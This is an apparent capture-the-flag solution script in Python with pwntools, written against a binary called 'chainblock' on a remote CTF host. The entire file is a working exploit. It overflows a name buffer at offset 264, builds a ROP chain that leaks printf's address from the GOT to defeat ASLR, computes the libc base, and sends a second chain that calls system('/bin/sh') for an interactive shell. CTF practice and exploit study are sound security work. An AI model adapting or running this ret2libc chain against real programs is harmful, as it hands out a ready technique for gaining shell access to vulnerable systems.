#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('chainblock')
libc = ELF('libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote('pwn.be.ax', 5000)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break *verify + 148
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  b'./'

io = start()

ret =       0x40124a


rop = ROP([exe, libc])
rop.raw(ret)
rop.call('printf', [exe.got.printf])
rop.raw(ret)
rop.call('main')

print(rop.dump())
payload = {
    264 : rop.chain()
}

payload = fit(payload)

io.recvuntil(b'Please enter your name:')
io.sendline(payload)
io.recvuntil(b'identity!\n')

printf_address = io.recv(6).ljust(8, b'\x00')
printf_address = u64(printf_address)
log.info(f'printf_address: {printf_address:#x}')

# libc relocation
libc.address = printf_address - libc.sym.printf

rop = ROP([exe, libc])
rop.raw(ret)
rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])

print(rop.dump())
payload = {
    264 : rop.chain()
}

payload = fit(payload)

io.recvuntil(b'Please enter your name:')
io.sendline(payload)

io.interactive()
